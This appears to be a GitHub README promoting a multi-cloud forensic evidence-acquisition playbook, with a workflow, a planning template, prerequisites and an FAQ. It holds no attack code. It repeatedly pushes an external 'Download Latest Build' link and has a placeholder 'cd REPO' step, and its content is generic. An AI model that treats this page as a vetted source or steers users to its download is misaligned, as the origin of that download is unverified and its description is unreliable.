# Cloud Forensic Acquisition Playbook v1.0 - Cloud Forensics Incident Response Playbook 2026

> **A version 1.0 field guide for coordinating forensic evidence collection during incidents involving AWS, Microsoft Azure, Google Cloud Platform, and private cloud infrastructure.**

[![Platform](https://img.shields.io/badge/Platform-Multi--cloud-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinweuflewis7776/cloud-forensic-evidence-playbook?style=flat-square)](https://github.com/kevinweuflewis7776/cloud-forensic-evidence-playbook)

---

<p align="center">
  <a href="https://kevinweuflewis7776.github.io/cloud-forensic-evidence-playbook/">
    <img src="https://img.shields.io/badge/Download-Cloud%20Forensic%20Acquisition%20Playbook%20Latest-brightgreen?style=for-the-badge" alt="Download Cloud Forensic Acquisition Playbook">
  </a>
</p>

> **[Download Cloud Forensic Acquisition Playbook v1.0](https://kevinweuflewis7776.github.io/cloud-forensic-evidence-playbook/)**

---

[Download Latest Build](https://kevinweuflewis7776.github.io/cloud-forensic-evidence-playbook/)

---

## Overview

Cloud Forensic Acquisition Playbook provides a repeatable framework for gathering and protecting digital evidence during investigations spanning multiple cloud providers. Its coverage includes AWS, Microsoft Azure, Google Cloud Platform, and private cloud systems, with procedures addressing volatile memory, storage volumes, control-plane activity, and identity logging.

Response teams can use the playbook to organize initial collection before moving evidence into a segregated forensic analysis environment. It also explains operational prerequisites, permissions, service accounts, acquisition tools, evidence vault planning, immutability, legal holds, manifests, and chain-of-custody documentation.

---

## Capabilities

- Establishes a common first-response acquisition method for AWS, Azure, GCP, and private cloud environments
- Prioritizes collection according to evidence volatility and time sensitivity
- Includes guidance for memory, storage-volume, control-plane, and identity-log acquisition
- Describes provider-specific collection steps and isolation requirements
- Structures preservation through legal holds, immutable storage, manifests, and custody tracking
- Guides movement of collected material into a separate forensic analysis environment
- Identifies access, service-account, tooling, and evidence-vault prerequisites
- Points to AVML, Volatility 3, Autopsy, Sleuth Kit, Proxmox VE, VMware vSphere, and OpenStack

---

## Getting Started

Obtain the repository by cloning it or downloading the current published build:

```bash
git clone https://github.com/kevinweuflewis7776/cloud-forensic-evidence-playbook.git
cd REPO
```

A standalone offline first-response console is included as one HTML file. Launch it with a modern web browser to consult the procedures without installing packages or running a server.

---

## Acquisition Workflow

Use the playbook to work through an investigation in the following order:

1. Determine the cloud provider and identify the affected resources.
2. Validate the required access, service accounts, collection tools, and approved evidence-vault destination.
3. Follow the collection sequence based on volatility.
4. Gather applicable memory, storage, control-plane, and identity evidence.
5. Document timestamps, manifests, custody transfers, and preservation steps.
6. Use immutability or legal holds when the case requires them.
7. Move the acquired evidence into an isolated analysis environment.
8. Proceed with examination using tools such as Volatility 3, Autopsy, or Sleuth Kit.

For private cloud cases, use the procedures corresponding to the infrastructure platform in scope, including Proxmox VE, VMware vSphere, or OpenStack.

---

## Case Planning

This project is workflow and documentation guidance rather than a runtime application with an independent configuration system. Before collecting evidence, review the applicable material and adjust the operational steps to the environment being investigated.

A planning entry may use a structure like this:

```text
Provider: AWS | Azure | GCP | Private Cloud
Incident reference: <case identifier>
Collection window: <UTC start and end>
Evidence vault: <approved destination>
Required access: <roles and service accounts>
Isolation destination: <analysis environment>
Custody record: <manifest and transfer references>
```

Do not place environment credentials, access information, or case-specific records in the published playbook.

---

## Prerequisites

- A modern web browser capable of opening the offline HTML console
- Authorized access to the applicable AWS, Microsoft Azure, Google Cloud Platform, or private cloud environment
- Approved user accounts, roles, or service accounts for collecting evidence
- An evidence vault with suitable preservation controls
- A separate analysis environment for receiving collected evidence
- Case-appropriate collection and analysis utilities, including tools such as AVML, Volatility 3, Autopsy, or Sleuth Kit
- Relevant experience with Proxmox VE, VMware vSphere, or OpenStack for private-cloud investigations where needed

The exact permissions and collection approach vary according to the provider, affected resources, and scope of the incident.

---

## Frequently Asked Questions

### Who should use this playbook?

The material is designed for incident responders, digital forensics specialists, cloud operations personnel, and investigators who require a consistent evidence-acquisition process across cloud platforms.

### Which cloud environments are included?

It covers AWS, Microsoft Azure, Google Cloud Platform, and private cloud deployments.

### What kinds of evidence does it address?

Coverage includes volatile memory, storage volumes, control-plane logs, and identity logs, as well as the related preservation and evidence-transfer activities.

### How do I prepare it for a new investigation?

Record the provider, affected resources, access requirements, evidence-vault location, isolation destination, collection timeframe, and custody references. After that, apply the acquisition instructions for the relevant provider.

### What is the response when a collection action fails?

Document the unsuccessful action and its timestamp, retain any available logs or partial results, check permissions and service-account scope, and proceed with the relevant fallback or next-priority step. Do not modify the source environment beyond the limits authorized by the response plan.

### Where can I find newer versions?

Check the repository and its published build link for updated releases of the playbook and offline console.

### Are forensic analysis applications included?

The playbook identifies tools and platforms that can assist with collection or analysis, such as AVML, Volatility 3, Autopsy, Sleuth Kit, Proxmox VE, VMware vSphere, and OpenStack. Installing, licensing, and operating those tools is outside the scope of this project.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
